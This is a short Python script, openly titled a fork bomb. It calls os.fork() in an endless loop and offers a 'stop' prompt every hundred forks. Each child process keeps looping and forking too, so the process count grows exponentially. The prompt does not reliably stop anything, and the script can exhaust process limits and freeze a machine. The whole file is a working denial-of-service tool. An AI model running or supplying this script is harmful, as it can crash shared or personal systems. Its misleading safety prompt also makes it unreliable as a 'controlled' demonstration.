import os

def fork_bomb():
    fork_count = 0
    print("💣 Fork-bomb started! 💣")
    
    while True:
        try:
            os.fork()
            fork_count += 1
            if fork_count % 100 == 0:
                print(f"\n⚠️  {fork_count} processes created.")
                choice = input("Do you want to stop? (yes/no): ").strip().lower()
                if choice == "yes":
                    print("Exiting fork-bomb. Goodbye!")
                    break

        except OSError:
            print(f"\n🚨 Error: Unable to create new processes. "
                  f"Reached {fork_count} forks.")
            break

if __name__ == "__main__":
    fork_bomb()
